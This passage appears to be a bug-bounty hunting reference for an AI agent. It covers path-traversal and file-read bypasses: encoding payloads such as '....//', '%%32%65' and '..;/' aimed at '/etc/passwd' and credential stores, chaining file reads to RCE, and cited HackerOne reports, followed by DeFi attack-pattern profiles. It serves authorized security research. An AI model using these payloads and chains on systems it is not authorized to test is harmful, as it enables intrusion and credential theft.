| Appended extension | `?` / `#` truncation; null byte `%00` (PHP < 5.3.4); valid `.md` prefix (#895972) |
| `file://` filter on a fetch | redirect through attacker host to `file://` (#996899); edit a `file` field to `url` (#8013) |
| Filtered meta-tag include | redirect `og:image` to the internal file (#996899) |
| Length-limited payload | move traversal into POST body / JSON / XML metadata field (#822262) |
| Patched normalization | check the patch order: validate-then-normalize is still exploitable (#1765631, #3328367) |
| Case-sensitive path block | uppercase invalid path to confuse cache/filter (#960618) |
| Symlink-only defense | cross the trust boundary via build output / restore (#697055, #213558) |

### Quick Reference: Encoding Decision Tree

```
Does the app strip `../` once?          -> ....//  (re-forms after strip)
Does it URL-decode once?                -> %2e%2e%2f then %252e%252e%252f if twice
Is `../` matched as a literal?          -> /etc/./passwd or /etc//passwd
Is there a fixed base dir prepended?    -> pad with ../ or use an absolute path
Is an extension appended (.md/.php)?    -> valid-prefix + traversal, or ?/#/null truncation
Is a leading slash required?            -> //../../../../etc/passwd (#411405)
Does a front-end filter see the path?   -> ..;/ or ! segment separators (#2817658, #2778380)
Is Apache 2.4.50 the target?            -> %%32%65 double encoding (#1404731)
Is it Windows/UNC?                      -> ..\..\ or CON:/PRN: device names (#3255707)
Is a patch in place?                    -> re-check normalization order (#1765631, #3328367)
```

Notes on bypass selection:

- Always determine **how many decode passes** the sink performs. One pass → `%2f`;
  two passes → `%252f`; Apache double-encoding bug → `%%32%65`.
- When the extension is forced (`.md`, `.php`, `.nupkg`), prefer a valid known-good
  prefix + traversal over truncation; #1639364 and #895972 show both patterns.
- When a filter matches a literal string, path ambiguity (`/etc/./passwd`) or a
  different separator (`!`, `..;/`) defeats the match without touching the filesystem
  API.

---

## Gate 0 Validation

Before writing the report, confirm all three. The corpus is full of reports that failed
because researchers confused a path echo or a block page with a real read.

### 1. Did you actually retrieve file contents (or a callback proving the read)?

- Direct proof: a literal `root:x:0:0:` line, valid base64 that decodes to PHP source,
  or a recognizable non-public file. Diff against a known-good param value — the
  delta must be the file body.
- Blind proof: a unique Collaborator hit, a MySQL connection to your server pulling
  `/etc/passwd`, or FFmpeg fetching your HLS URL — tied to one specific sink.
- **NOT proof:** an echoed path (`failed to open '../../etc/passwd'`), a different
  status code, a WAF page, or a "page looks different." Retract these.
- Negative control: `/etc/passwd_<rand>` must NOT return the content. Reflection is
  not a read.
- For source reads, the base64 must decode to valid PHP. A garbage/empty decode means
  there was no real read.

### 2. What does the victim actually lose?

- Sensitive file read (secrets, keys, session store, credential DB like `data.mdb`):
  High→Critical. Source disclosure: Medium→High (new sinks + hardcoded secrets).
- Full path disclosure alone: Informational/Low — use it as a stepping stone.
- If it chains to RCE (authorized_keys, cron, filter-chain, CVE-2019-11510) or cloud
  credential theft (SA token via ingress-nginx), score Critical and show the chain.
- Quantify the specific file, its sensitivity, and the reachable blast radius.

### 3. Can it be reproduced in 10 minutes from scratch?

- Is the endpoint live, the param still present, and the exact file path stable?
- Does the content match (not a one-off error) on repeat? For blind reads, does the
  callback hit reliably?
- Can a second person follow only your steps and get the same file body?
- For CVE rediscovery, state the exact product/version and unredacted PoC request.

### Severity Rubric (from the corpus)

| Finding | Typical severity | Example |
|---------|------------------|---------|
| Full path disclosure / verbose error | Informational–Low | #8090, #9745, #125197, #145260 |
| Read of non-sensitive file (`/etc/hosts`) | Low–Medium | #229622 |
| Read of `/etc/passwd` with no secret | Medium | #1419213, #260420 |
| Read of credentials / source / session store | High | #671749, #1643962, #415233 |
| Read → RCE (keys, cron, filter-chain, CVE chain) | Critical | #733072, #822262, #695005, #2585378 |
| Cloud/K8s credential read via ingress/ActiveStorage | Critical | #2701701, #1382919, #3580511 |

### Common False Positives to Retract

- Echoed path: the server repeats `../../etc/passwd` in an error — no file was read.
- Status-code-only delta: 403 for `../`, 200 for normal — likely string matching.
- WAF / block page: a "page looks different" because a WAF intervened, not because bytes
  were returned.
- Reflection of a marker you planted: the body contains your input, not the file.
- One-off length/latency delta: with no third known-good path to confirm, it is noise.
- Base64 that decodes to garbage: not a real PHP source read.

### Evidence to Capture Before Submitting

- The exact request (method, parameters, headers, body) that produced the read.
- The returned file body, with the specific fingerprint line highlighted
  (`root:x:0:0:`, a valid PHP opening tag, the LMDB credential store contents).
- The negative-control request (`/etc/passwd_<rand>`) and its response showing no file.
- The baseline (benign parameter) response for comparison.
- For blind reads: the Collaborator / MySQL server / HLS callback log with a unique
  marker tied to one sink.
- Product/version banner for CVE rediscovery (e.g. Apache 2.4.49, Cisco ASA).
- A one-line impact statement naming the file and what an attacker gains from it.

---

## Real Impact Examples

### Scenario A — Container escape to host file read via symlink (Semmle/LGTM pattern)

LGTM let users view a build's file list and kept only source/build config, processing
`lgtm.yml` and skipping `.lgtm.yml` but retaining both. An attacker created `lgtm.yml`
with valid config and a symlink named `.lgtm.yml` pointing at a host file. After the
build, `.lgtm.yml` contained the HOST's file content. A second variant removed
`build.log` and replaced it with a symlink to `/etc/passwd`; when the host copied the
file back out of the container it followed the symlink on the HOST filesystem and
leaked `/etc/passwd` (#697055, #694181). Trivial to reproduce, Critical (CVSS 9.3),
$2,000 each — demonstrates that a symlink crossing a trust boundary is a full
arbitrary host-file read.

### Scenario B — Package-registry metadata traversal escalated to RCE (GitLab pattern)

GitLab's NuGet registry inserted user-controlled `<version>` metadata into a `.nupkg`
filename with no path validation: `<version>../../../../../nyangawa</version>` escaped
the intended directory (#822262). The Maven registry variant allowed writing any file
writable by the `git` user; combined with a Gitaly race, the attacker wrote
`~/.ssh/authorized_keys` and got an SSH shell (#733072). The file primitive became
code execution because the readable/writable location was chosen by the attacker.

### Scenario C — Pre-auth appliance file read to full credential/RCE chain (Pulse Secure)

CVE-2019-11510 let an unauthenticated attacker read arbitrary files via a path-
normalization flaw in `/dana-na/.../guacamole/../../../../etc/passwd` (#695005,
#696276). To show real impact, researchers escalated from `/etc/passwd` to the LMDB
store `/data/runtime/mtmp/lmdb/dataa/data.mdb`, which contains cleartext usernames and
passwords (#671749); with those credentials they logged in and chained post-auth
command injection. The file read alone would have been "medium at best" — the chosen
file turned it Critical. The same pattern recurs across Apache (read password file →
brute-force, #1394916) and Cisco ASA (read config → bypass, #695429).

### Scenario D — Renderer LFI to serialized-object and XXE chain (CTF pattern)

The h1-5411 CTF exposed an LFI that read `.php` files; reading source disclosed a PHP
serialization bug and an XXE used as SSRF into hidden maintenance pages (#415233).
Similarly, an emblem editor rendered server-side text files onto a user's emblem,
letting the researcher "extract text files from the server and HTTP responses"
(#347139), and PDF-export HTML injection produced LFI (#809819). Read a file → find
the next sink → chain.

### Scenario E — Media-processing read + SSRF (Automattic pattern)

A paid wordpress.com account could upload an AVI; FFmpeg processed HLS playlists that
reference external files. The researcher embedded GAB2 subtitle chunks pointing at an
attacker URL in the AVI, uploaded it, and triggered video processing. The conversion
nodes fetched the URL and could be induced to read their own local files and fire
SSRF requests (#237381). This illustrates that image/video features are file-read
surfaces even with no filename parameter.

### Scenario F — Full path disclosure as the first step, not the finding (Localize pattern)

A cluster of Localize reports (#8013, #8090, #9745, #19363, #15899, #9256, #7903)
started with an innocuous error: importing a malformed XML file, passing an array where
a string was expected, or hitting a CSRF validation failure produced a PHP warning with
the absolute installation path (`/var/www/vhosts/.../index.php on line 421`). On its
own that is Informational. Its real value is that it hands the attacker the exact base
directory needed to make a relative traversal deterministic. Treat every full-path
error as reconnaissance: record the path, then hunt for a sink where you can append
`../../etc/passwd` or a framework config file.

### Scenario G — Ingress annotation → service-account token (Kubernetes pattern)

An attacker with permission to create/modify ingresses in a multi-tenant cluster could
inject arbitrary nginx directives into the `connection-proxy-header` annotation because
the `path` parameter was permissive. The injected directive made the ingress controller
read an arbitrary local file — including its own Kubernetes service-account token —
and return it (#2701701, #1382919). This is a file read whose blast radius is the entire
cluster: the token is a credential, so the read converts straight into K8s privilege
escalation. It demonstrates why "read the service account / credential file" is the
top Crown Jewel target.

---

## Disclosed Report Citations

All IDs below are real and appear in the study pack or the TOP-file-reading index.
Format: **Company — title** ([H1 #id](https://hackerone.com/reports/id)) — subclass,
technique, year/bounty.

1. **Semmle — Worker container escape lead to arbitrary file reading in host machine [again]** ([H1 #697055](https://hackerone.com/reports/697055)) — symlink escape, `.lgtm.yml` symlink to host file, 2019 / $2,000.
2. **Semmle — Worker container escape lead to arbitrary file reading in host machine** ([H1 #694181](https://hackerone.com/reports/694181)) — symlink escape, `build.log` replaced by symlink to `/etc/passwd`, 2019 / $2,000.
3. **GitLab — Path traversal, to RCE** ([H1 #733072](https://hackerone.com/reports/733072)) — package registry path traversal → `authorized_keys` write → SSH RCE, 2019 / $12,000.
4. **GitLab — Path traversal in Nuget Package Registry** ([H1 #822262](https://hackerone.com/reports/822262)) — XML `<version>` metadata → `../../` traversal + Gitaly race, 2020 / $12,000.
5. **Aiven Ltd — Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read** ([H1 #1415820](https://hackerone.com/reports/1415820)) — unauth path traversal, `%2F`-encoded traversal in `/public/plugins/`, 2021 / $1,000.
6. **Internet Bug Bounty — Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49** ([H1 #1394916](https://hackerone.com/reports/1394916)) — CVE-2021-41773, path normalization flaw → file read, 2021 / $4,000.
7. **Internet Bug Bounty — Path Traversal and RCE in Apache 2.4.49/2.4.50 (CVE-2021-42013)** ([H1 #1400238](https://hackerone.com/reports/1400238)) — incomplete-fix bypass, `%%32%65` traversal → RCE, 2021 / $1,000.
8. **Internet Bug Bounty — Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50** ([H1 #1404731](https://hackerone.com/reports/1404731)) — double-encoding bypass, `%%32%65` payloads, 2021 / $1,000.
9. **Ruby on Rails — File writing by Directory traversal at actionpack-page_caching and RCE by it** ([H1 #519220](https://hackerone.com/reports/519220)) — cache-layer traversal, encoded `.`/`/` → RCE, 2019 / $1,000.
10. **MariaDB — Grafana LFI on https://grafana.mariadb.org** ([H1 #1419213](https://hackerone.com/reports/1419213)) — unauth LFI, long `../` chain to `/etc/passwd`, 2021 / $0.
11. **U.S. Dept Of Defense — Unauthenticated LFI using the symbol `!`** ([H1 #2778380](https://hackerone.com/reports/2778380)) — Jolokia diagnostic-command path traversal, `!` dir separator, 2024 / $0.
12. **Automattic — SSRF and local file disclosure in wordpress.com/media/videos via FFmpeg HLS processing** ([H1 #237381](https://hackerone.com/reports/237381)) — media-coder read + SSRF, GAB2 subtitle chunks in AVI, 2017 / $0.
13. **U.S. Dept Of Defense — LFI with potential to RCE using CVE-2019-3396** ([H1 #538771](https://hackerone.com/reports/538771)) — Confluence `file://` template include, `_template` param, 2019 / $0.
14. **Infogram — LFI through the MySQL connection** ([H1 #719875](https://hackerone.com/reports/719875)) — `LOAD DATA LOCAL INFILE '/etc/passwd'` to attacker MySQL server, 2019 / $0.
15. **Nextcloud — Remote code execution via path traversal in Zip extraction in the Extract app** ([H1 #765291](https://hackerone.com/reports/765291)) — ZIP-slip extraction traversal → RCE, 2019 / $0.
16. **Node.js — Windows Device Names Still Allow Path Traversal in UNC Paths After CVE-2025-27210 Fix** ([H1 #3255707](https://hackerone.com/reports/3255707)) — incomplete patch, device-name + UNC `path.join()` escape, 2025 / $0.
17. **U.S. Dept Of Defense — Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN** ([H1 #695005](https://hackerone.com/reports/695005)) — CVE-2019-11510, `--path-as-is` normalization abuse → RCE, 2019 / $0.
18. **Algolia — Directory traversal at https://msg.algolia.com** ([H1 #333306](https://hackerone.com/reports/333306)) — double-encoded `..%252f` static-path traversal, 2018 / $0.
19. **U.S. Dept Of Defense — Pulse Secure File disclosure, clear text and potential RCE** ([H1 #671749](https://hackerone.com/reports/671749)) — CVE-2019-11510 + LMDB `data.mdb` cleartext credential read, 2019 / $0.
20. **Lab45 — SSRF to AWS file read** ([H1 #978823](https://hackerone.com/reports/978823)) — proxy endpoint SSRF → AWS metadata + local file read, 2020 / $0.
21. **Shopify — Path Traversal in App Proxy** ([H1 #869888](https://hackerone.com/reports/869888)) — proxy path prefix escape, `b.php/../../`, 2020 / $0.
22. **curl — Directory Traversal Vulnerability in cURL via Content-Disposition Header Processing** ([H1 #3408126](https://hackerone.com/reports/3408126)) — `-O -J` filename parsing → path traversal, 2025 / $0.
23. **U.S. Dept Of Defense — Local File Inclusion in download.php** ([H1 #1639364](https://hackerone.com/reports/1639364)) — `filePathDownload` valid-prefix + traversal to `/etc/passwd`, 2022 / $0.
24. **Visma Public — HTML-injection in PDF-export leads to LFI** ([H1 #809819](https://hackerone.com/reports/809819)) — server-side PDF renderer HTML injection → LFI, bounty $500.
25. **Evernote — Full read SSRF that can leak AWS metadata and local file inclusion** ([H1 #1189367](https://hackerone.com/reports/1189367)) — base64-encoded URL in proxy path → metadata + LFI, bounty $0.
26. **Keybase — Write files anywhere in userland using relative path in 'download attachment'** ([H1 #713006](https://hackerone.com/reports/713006)) — relative path in download feature → arbitrary file write, bounty $5,000.
27. **Mozilla — Mozilla VPN Clients: RCE via file write and path traversal** ([H1 #2995025](https://hackerone.com/reports/2995025)) — `live_reload` remote file command → file write/path traversal → RCE, bounty $6,000.
28. **Uber — Arbitrary File Reading on Uber SSL VPN** ([H1 #617543](https://hackerone.com/reports/617543)) — pre-auth arbitrary file read on SSL VPN, bounty $6,500.
29. **Rockstar Games — LFI and SSRF via XXE in emblem editor** ([H1 #347139](https://hackerone.com/reports/347139)) — emblem rendering LFI + XXE/SSRF chain, bounty $1,500.
30. **Internet Bug Bounty — Apache mod_rewrite weakness when first segment matches filesystem path (CVE-2024-38475)** ([H1 #2585378](https://hackerone.com/reports/2585378)) — mod_rewrite path-to-filesystem confusion → read, bounty $4,920.

---

## Related Skills & Chains

- **`hunt-lfi`** — sibling primitive: when the file-read sink is a PHP `include`/`require`,
  upgrade the read with `php://filter/convert.base64-encode` and then to filter-chain
  RCE (Synacktiv) with no upload needed. Chain: file read → source disclosure → new
  sinks → filter-chain RCE.

- **`hunt-ssrf`** — file-read and SSRF overlap heavily in renderers/proxies (#237381,
  #1189367, #978823). Chain: `file://` fetch or metadata read via proxy → cloud
  credentials; apply the SSRF OOB gate to blind file-read callbacks.

- **`hunt-rce`** — a file read becomes Critical when you control the destination:
  `authorized_keys` (#733072), cron via archive extraction, filter-chain, or
  CVE-2019-11510 post-auth injection (#695005, #671749).

- **`cloud-iam-deep`** — ingress-nginx annotation read of the service-account token
  (#2701701, #1382919) and ActiveStorage blob-key traversal (#3580511) yield
  cloud/K8s credentials → IAM/Kubernetes privilege escalation.

- **`hunt-file-upload`** — archive/restore/image-upload surfaces are the delivery
  vehicle for ZIP-slip and tar-symlink file reads (#205481, #765291, #213558).

- **`security-arsenal`** — load the path-traversal / encoding bypass table (double
  encoding, `..;/`, `!` separators, UNC device names, overlong UTF-8) before testing
  filters.

- **`triage-validation`** — apply the Gate 0 discipline: show file *contents* plus a
  negative control (`/etc/passwd_<rand>` returns nothing). An echoed path or a lone
  status-code change is never a file read.

- **`hunt-cloud-misconfig`** — full path disclosure and debug artifacts (#3002345,
  #2778441) often reveal cloud bucket paths and internal hostnames that feed the
  file-read chain.


---

## Merged Source Knowledge

This section consolidates **63 unique knowledge blocks** from 2 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (64 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/bountyforge/skills/pashov/x-ray/references/threats.md`

# Protocol-Type Threat Profiles

> **HOW TO USE THIS FILE**
>
> Treat this file as a threat *identification* library, **not** as a prose template for the final report.
>
> - **In Step 2e (Protocol Classification)** — use the detection-signals table to label the protocol by type.
> - **In Step 3a (Writing Section 2 of x-ray.md)** — use adversary rankings, attack patterns, and critical invariants listed here to know *what to look for* and *who threatens the protocol*, then TRANSLATE that knowledge into the output format.
>
> **DO NOT copy exploit-chain prose verbatim into Key Attack Surfaces.** Phrases like *"Oracle manipulation → inflated collateral → drain the pool"* are intentional here — they teach the threat — but the `templates.md` **DO-NOT-EXPLOIT RULE** forbids them in the report. Convert "→ attacker drains X" into "worth tracing…" / "worth checking…" / "worth confirming…" when writing the bullet. Name the surface and the concern; let the auditor finish the sentence.

This reference provides per-protocol-type threat intelligence. The skill auto-classifies the protocol from code signals in Step 2, then uses the matching profile(s) to weight adversaries, attack patterns, and surfaces in the threat model.

## Protocol Classification Signals

Detect protocol type from function signatures, state variables, and architectural patterns found during source file reading in Step 2. A protocol may match **multiple types** (hybrid). Rank by signal density — the type with the most matches is primary.

| Type | Detection Signals in Code |
|------|--------------------------|
| **Lending/Borrowing** | `borrow()`, `repay()`, `liquidate()`, `liquidationBonus`, `healthFactor`, `collateralFactor`, `LTV`, `debtToken`, `interestRate`, collateral ratio math, health factor calculations, borrow/supply balance tracking |
| **DEX/AMM** | `swap()`, `addLiquidity()`, `removeLiquidity()`, constant-product math (`x * y = k`), stable-swap invariant, `sqrtPriceX96`, `tick`, LP token mint/burn, fee tier, `getAmountOut()`, reserves tracking |
| **Yield Aggregator** | ERC4626 vault pattern (`deposit`/`withdraw`/`convertToShares`/`convertToAssets`), strategy pattern (deposit into external protocol + `harvest()`), yield routing, `totalAssets()`, `strategyDebt`, auto-compound |
| **Stablecoin** | Peg mechanism (mint/burn against collateral), `collateralRatio`, stability fee, `debtCeiling`, redemption mechanism, PSM (peg stability module), `anchor`/`peg`/`target` price references |
| **Derivatives/Perps** | `openPosition()`, `closePosition()`, `increaseSize()`, `decreaseSize()`, `fundingRate`, `margin`, `leverage`, PnL calculation, `markPrice`, `indexPrice`, position struct with size/collateral/entryPrice |
| **Liquid Staking** | `stake()` + derivative token mint, `unstake()`/`requestWithdrawal()`, exchange rate calculation, validator set management, withdrawal queue, rebasing token or share-based token |
| **Bridge** | Cross-chain message passing, `lock()`/`unlock()` or `burn()`/`mint()` pattern, relayer/validator set, message nonce, chain ID checks, merkle proof verification |
| **Governance** | `propose()`, `vote()`, `execute()`, `queue()`, quorum calculation, voting power snapshots, timelock, delegation, `proposalThreshold` |

### Hybrid Classification

Many protocols combine types. When multiple types match:
1. Rank by signal count — more matches = higher weight in threat model
2. The **primary type** determines adversary ranking order
3. **Secondary types** add their unique threats to the model (de-duplicating overlapping ones)
4. In the output, state: "Protocol classified as: **[Primary]** with **[Secondary]** characteristics"

Example: A protocol with `swap()`, `addLiquidity()`, `borrow()`, `liquidate()` → Primary: DEX/AMM, Secondary: Lending/Borrowing.

---

### Lending / Borrowing

**Primary adversaries** (ranked by historical exploit frequency):
1. **Flash loan attacker** — Borrows unlimited capital in a single transaction to manipulate oracle prices, inflate collateral values, and drain borrow capacity. Flash loans reduce the cost of oracle manipulation to near-zero.
2. **Oracle manipulator** — Manipulates price feeds (spot or TWAP) to make collateral appear more valuable or debt appear less valuable. The oracle is the single source of truth for solvency — if it lies, everything downstream breaks.
3. **Liquidation MEV searcher** — Extracts value from liquidation events through front-running, back-running, or sandwich attacks. If MEV extraction makes liquidation unprofitable for honest liquidators, bad debt accumulates.
4. **Malicious first depositor** — In protocols with share-based accounting (supply tokens, debt tokens), the first depositor can manipulate the share price to steal from subsequent depositors. Classic vault inflation attack applied to lending pools.
5. **Compromised admin** — Can change collateral factors, oracle addresses, interest rate models, or pause liquidations. Any of these can instantly make the protocol insolvent or prevent it from recovering.

**Dominant attack patterns:**
- Oracle manipulation → inflated collateral value → max borrow → drain lending pool
- Flash loan borrow → manipulate spot price → liquidate victim at wrong price → profit from liquidation bonus
- Bad debt accumulation through positions that become unliquidatable (oracle lag, gas price spikes, illiquid collateral)
- Interest rate manipulation via large deposit/withdraw cycles (move utilization to manipulate rates)
- Collateral factor misconfiguration allowing undercollateralized borrowing
- Recursive borrowing: deposit collateral → borrow → deposit borrowed asset as collateral → borrow again → amplified exposure that collapses under price movement

**Critical invariants:**
- `totalBorrows <= totalCollateral * LTV` — always, for every market and every account
- Every position must be liquidatable before it can cause bad debt (health factor trigger > underwater threshold)
- Liquidation must be profitable for liquidators (otherwise bad debt accrues silently)
- Oracle price reflects fair market value within acceptable deviation and freshness bounds
- Interest accrual is monotonic and cannot be manipulated to extract value

**What to look for first:**
1. The complete price calculation path: oracle read → price normalization → collateral value → health factor. Every step is a manipulation point.
2. Can a single transaction borrow, manipulate price, and liquidate? If yes, flash loan attack is viable.
3. Liquidation math: is the bonus sufficient to cover gas + slippage? What happens when collateral is illiquid?
4. Share price calculation for supply/debt tokens: what happens when totalSupply == 0?
5. What can admin change instantly vs. through timelock? Can admin change oracle address?

---

### DEX / AMM

**Primary adversaries** (ranked):
1. **MEV searcher / sandwich attacker** — The dominant threat to DEX users. Monitors mempool for pending swaps, inserts transactions before and after to extract value. Every swap without adequate slippage protection is a guaranteed extraction opportunity.
2. **Flash loan price manipulator** — Uses flash-loaned capital to move pool prices within a single transaction.
3. **Malicious first LP / empty pool attacker** — Manipulates pool initialization or empty-state transitions. In concentrated liquidity: can set initial tick to a manipulated price. In constant-product: can inflate LP share price through donation before the first real deposit.
4. **Liquidity manipulation attacker** — Adds and removes liquidity strategically to extract value from other LPs.
5. **Compromised admin** — Can change fee structures, pause trading, modify routing, or whitelist malicious pools.

**Dominant attack patterns:**
- Sandwich attacks: front-run swap to move price → victim swaps at worse price → back-run to capture difference
- LP share inflation on empty/new pools (donate assets to inflate share price before real deposits)
- Reentrancy through token callbacks (ERC-777, ERC-1155 hooks) during swap execution when pool state is inconsistent
- Price oracle exploitation: other protocols read AMM spot price, attacker manipulates pool in same tx, other protocol uses wrong price
- Concentrated liquidity tick manipulation: force price through tick boundaries to trigger stop-loss-like behavior in other positions
- Fee-on-transfer token accounting errors: pool receives fewer tokens than expected, invariant breaks

**Critical invariants:**
- Pool invariant holds before and after every operation (k = x * y, or curve-specific)
- LP share value is monotonically non-decreasing from fees (absent impermanent loss)
- No tokens can be extracted without proportional LP burn or valid swap math
- Swap output amount matches the invariant-derived calculation exactly (no rounding exploitation)
- Reserves tracked in contract state match actual token balances (no donation attack surface)

**What to look for first:**
1. Swap math: is the invariant correctly maintained? Are there rounding errors that consistently favor one direction?
2. LP mint/burn math: what happens at totalSupply == 0? Is there minimum liquidity enforcement?
3. Does the pool expose `getPrice()`, `observe()`, or similar that other contracts call? If yes, it's an oracle and manipulation has external blast radius.
4. Slippage protection: is it enforced at the router level? Can it be bypassed? What's the default?
5. Reentrancy guards: does the swap update state before making external calls (token transfers)?

---

### Yield Aggregator / Vault

**Primary adversaries** (ranked):
1. **Share inflation attacker (first depositor)** — The canonical vault attack. Deposit 1 wei, donate a large amount directly to the vault (inflating `totalAssets` without minting shares), then when the next user deposits, they receive 0 shares due to rounding and the attacker redeems for the donated + deposited amount.
2. **Malicious/compromised strategy** — Strategies hold the actual funds. A malicious strategy can report fake losses, retain approvals after migration, or transfer funds out.
3. **Reentrancy through external protocol callbacks** — Vault deposits into Aave/Compound/Yearn, which may trigger callbacks during deposit/withdraw. If vault state is inconsistent during the callback window, reentrancy can manipulate share prices.
4. **Donation/direct-transfer attacker** — Sends tokens directly to the vault contract (not through deposit()) to manipulate `totalAssets()` and therefore share price. If `totalAssets` reads `balanceOf(address(this))`, any donation changes the share price.
5. **Compromised admin** — Can add malicious strategies, change allocation weights, set harvester address, or migrate funds to attacker-controlled strategy.

**Dominant attack patterns:**
- ERC4626 share inflation: deposit(1) → donate(large amount) → next depositor gets 0 shares → redeem(all)
- Strategy reports fake gain → inflated share price → attacker deposits at inflated price → strategy reports real value → attacker loses nothing, previous depositors diluted
- Strategy retains token approval after migration to new strategy — old strategy can still pull funds
- Harvest sandwich: front-run harvest() with deposit (get shares cheap), harvest increases totalAssets, back-run with withdraw (redeem at higher share price)
- Vault accounting desync: strategy's real balance differs from vault's recorded allocation due to external protocol behavior (rebasing, slashing, reward accrual)

**Critical invariants:**
- `totalAssets()` accurately reflects real underlying value at all times
- `convertToShares(convertToAssets(shares)) <= shares` — round-trip must not create value
- `convertToAssets(convertToShares(assets)) <= assets` — same in reverse
- Strategy cannot extract more than it was allocated
- Share price can only increase from yield, never from manipulation

**What to look for first:**
1. Share price calculation: `convertToAssets` / `convertToShares`. Is there a virtual offset or minimum deposit to prevent inflation attacks?
2. Strategy interface: what can a strategy do? Can it report arbitrary gain/loss? Who can add/remove strategies?
3. Does `totalAssets()` use `balanceOf(this)` or internal accounting? If balanceOf, donation attacks are possible.
4. Deposit/withdraw: is there reentrancy protection? Are state changes before external calls?
5. Strategy migration: does the old strategy lose all approvals? Is there a cooldown?

---

### Stablecoin

**Primary adversaries** (ranked):
1. **Oracle manipulator** — If collateral price is manipulated upward, attacker can mint stablecoins against less real collateral. If manipulated downward, legitimate positions get liquidated at unfair prices. In algorithmic stablecoins, oracle manipulation can trigger or amplify depegs.
2. **Economic/governance attacker** — Acquires governance power to change collateral parameters (lower ratios, add risky collateral, change stability fees) to extract value or destabilize the peg. Can also manipulate stability mechanisms.
3. **Bank run attacker** — Triggers mass redemption by creating panic or exploiting information asymmetry. If the stablecoin's redemption mechanism has capacity limits, a strategic redemption can drain the best collateral, leaving remaining holders with worse backing.
4. **Flash loan minter** — Flash loans capital to mint stablecoins, manipulates collateral price, and profits from the discrepancy. Especially dangerous if minting has no cooldown or rate limit.
5. **Compromised admin** — Can change collateral types, oracle addresses, debt ceilings, stability fees, or pause redemptions. Any of these can break the peg or trap user funds.

**Dominant attack patterns:**
- Collateral price manipulation → mint at inflated collateral value → sell stablecoins → collateral price returns to normal → protocol is undercollateralized
- Algorithmic death spiral: sell pressure → depeg → collateral value drops → more liquidations → more sell pressure → repeat (LUNA/UST)
- Redemption mechanism DOS: spam redemptions to drain liquid collateral, leaving illiquid collateral backing remaining supply
- Governance attack: change collateral ratio to allow undercollateralized minting
- Oracle staleness exploitation: mint when oracle reports stale (higher) price, redeem when oracle updates to real (lower) price

**Critical invariants:**
- Every stablecoin unit is backed by >= 1:1 collateral value (or >= configured ratio)
- Mint and redeem are inverse operations: round-trip preserves value (no profitable loops)
- Peg mechanism is convergent, not divergent, under sell pressure
- Liquidation can always restore individual position collateralization
- Total supply <= total debt ceiling across all collateral types

**What to look for first:**
1. Minting path: what collateral is accepted → how is it valued (oracle) → what's the ratio → can the ratio be changed?
2. Redemption path: can all stablecoins be redeemed simultaneously? Is there a priority queue? What happens under stress?
3. Liquidation mechanism: is it profitable? What happens if collateral price drops faster than liquidations can execute?
4. What can governance change? How quickly? Is there a peg-break emergency mechanism?
5. Death spiral analysis: if the stablecoin depegs 10%, does the mechanism push it back or amplify the depeg?

---

### Derivatives / Perps

**Primary adversaries** (ranked):
1. **Oracle manipulator** — In derivatives, oracle errors are amplified by leverage. A 1% oracle manipulation on a 50x leveraged position creates a 50% PnL swing.
2. **Liquidation MEV searcher** — Extracts value from liquidation events. In perps, positions can be large and leverage amplifies the liquidation bonus. May also manipulate price to trigger liquidations, then capture the liquidated collateral.
3. **Funding rate manipulator** — Skews open interest to force favorable funding rate payments. With enough capital, can make the funding rate so extreme that opposing positions are forced to close, then reverse to capture the funding.
4. **Position size attacker** — Opens positions larger than the protocol can pay out, or opens positions across multiple accounts to circumvent limits. If the protocol's liquidity pool cannot cover max payout, insolvency results.
5. **Compromised admin** — Can change max leverage, funding rate parameters, liquidation thresholds, or oracle addresses. Can also pause liquidations (creating bad debt) or enable instant position changes that bypass risk checks.

**Dominant attack patterns:**
- Oracle manipulation → cascade liquidation → profit from liquidated positions
- Funding rate manipulation through concentrated one-sided open interest
- Position size exceeding protocol's payout capacity (adversary opens at max leverage, market moves in their favor, protocol can't pay)
- Delayed/stale oracle → risk-free directional bet (see current price off-chain, trade at stale on-chain price)
- Cross-margin exploitation: loss in one position affecting collateral of another, creating liquidation cascades within a single account
- ADL (auto-deleveraging) manipulation: force ADL on profitable opposing positions by creating insolvency conditions

**Critical invariants:**
- Sum of all PnL = 0 (zero-sum between longs and shorts, minus fees)
- Available liquidity >= maximum payout of all open positions under worst-case price movement
- Liquidation triggers before any position can cause bad debt to the system
- Funding rate converges open interest imbalance over time (doesn't diverge)
- Mark price cannot deviate from index price beyond safety bounds

**What to look for first:**
1. PnL calculation: is it correct under all conditions (positive, negative, at leverage limits)?
2. Liquidation threshold vs. actual execution: is there enough margin between liquidation trigger and insolvency?
3. Oracle: mark price vs. index price. How is mark price calculated? Can it be manipulated within a block?
4. Max open interest / position size limits: are they enforced? What happens if total payouts exceed pool?
5. Funding rate: can it be manipulated? What's the maximum rate? Can it drain margin faster than expected?

---

### Liquid Staking

**Primary adversaries** (ranked):
1. **Exchange rate manipulator** — The derivative token's value depends on an exchange rate (stETH/ETH, rETH/ETH). If this rate can be manipulated (through rewards reporting, slashing events, or direct donation), attackers can buy/sell the derivative at wrong prices against protocols that use it as collateral.
2. **Validator set attacker** — Compromises or controls validators that the protocol delegates to. Can trigger slashing events, withhold rewards, or censor transactions. The trust model around validator selection is critical.
3. **Withdrawal queue attacker** — Exploits timing or ordering in the unstaking queue. May front-run large unstake requests to exit first, or manipulate queue mechanics to delay others' withdrawals.
4. **Oracle/rate arbitrageur** — Exploits lag between the on-chain exchange rate and real underlying value. When a slashing event occurs, the on-chain rate may not update immediately — attacker sells derivative at stale (higher) rate before the slash is reflected.
5. **Compromised admin** — Can change validator set, fee parameters, oracle addresses, or withdrawal mechanisms. Can also pause withdrawals, trapping user funds.

**Dominant attack patterns:**
- Rewards/slashing reporting manipulation: report fake rewards to inflate exchange rate, or delay slashing report to exit at stale rate
- Withdrawal queue griefing: spam small unstake requests to delay large withdrawals
- Rebasing token integration bugs: protocols that integrate the liquid staking derivative may not handle rebasing correctly
- Validator collusion: validators withhold blocks or MEV to reduce rewards below expected rate
- Share price manipulation through direct ETH/token transfer to the contract

**Critical invariants:**
